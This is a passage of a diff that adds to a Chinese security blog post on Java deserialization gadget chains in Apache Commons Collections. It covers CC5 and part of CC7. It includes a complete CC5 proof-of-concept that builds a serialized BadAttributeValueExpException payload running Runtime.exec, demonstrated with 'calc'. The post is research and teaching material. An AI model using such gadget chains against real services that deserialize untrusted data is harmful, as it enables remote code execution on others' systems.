+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+<h2 id="完善-1"><a href="#完善-1" class="headerlink" title="完善"></a>完善</h2><p>但是实际上上边的poc在序列化过程会执行命令，但是在反序列化过程中反而不会执行</p>
+<p>原因就是在的构造函数里BadAttributeValueExpException</p>
+<pre class="language-java" data-language="java"><code class="language-java">public BadAttributeValueExpException (Object val) &#123;
+    this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString();
+&#125;</code></pre>
+
+<p>可以看到在构造的时候就已经调用了toString函数导致了命令执行，并且还改变了val的值，导致无法在反序列时执行</p>
+<p>这里也是用反射，在实例化BadAttributeValueExpException对象时放个空值，然后再把里边的val值改了就行</p>
+<p>最终poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">package org.cc5;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class cc5 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);
+        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);
+
+        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry);
+        Class aClass &#x3D; badAttributeValueExpException.getClass();
+        Field declaredField &#x3D; aClass.getDeclaredField(&quot;val&quot;);
+        declaredField.setAccessible(true);
+        declaredField.set(badAttributeValueExpException,tiedMapEntry);
+        ser(badAttributeValueExpException);
+        unser();
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>CC7的后半部分还是调用lazymap的get方法然后到InvokerTransformer.transform</p>
+<p>但是与其他的cc链不同，cc7利用AbstractMap的equals方法来调用lazymap的get方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323230014807.png" alt="image-20230323230014807"></p>
+<p>这里只要控制m是lazymap类的对象就可以了，这个m也就是我们传入的o</p>
+<p>然后再去找调用了equals方法的类</p>
+<p>cc7里用的是HashTable类的reconstitutionPut方法</p>
+<p><img src="/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230323230621690.png" alt="image-20230323230621690"></p>
+<p>这里的key是我们可控的，在HashTable的readObject方法里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323231044314.png" alt="image-20230323231044314"></p>
+<p>这个key是从readObject方法里拿到的，那writeObject里应该也有</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323231233055.png" alt="image-20230323231233055"></p>
+<p>这里的话他进行序列化，首先写入了table的长度以及table的元素个数，然后取出table中的元素，放入entryStack，这里其实就是栈，然后把栈里面的每个元素用writeObject写入。</p>
+<p>很明显了，这里传递的实际上就是HashTable#put时添加进去的key和value。</p>
+<p>那么也就是说key是可控的，key可控所以e.key.equals(key)也可控</p>
+<p>那么m就是我们可控的，然后达到调用lazymap.get的目的</p>
+<h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p>虽然调用链已经弄清楚了，但是在编写poc之前还有几个要注意的地方</p>
+<p>1.首先创建的Hashtable对象至少要put两次</p>
+<p>因为第一次put时table里是空的，不会进入if判断，而在第二次时，第一次的数据已经进入了table，这时候才会进入if</p>
 
                 
             </div>
@@ -2022,7 +2433,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">192.2k</span>
+                        class="white-color">195.4k</span>
             
             
             
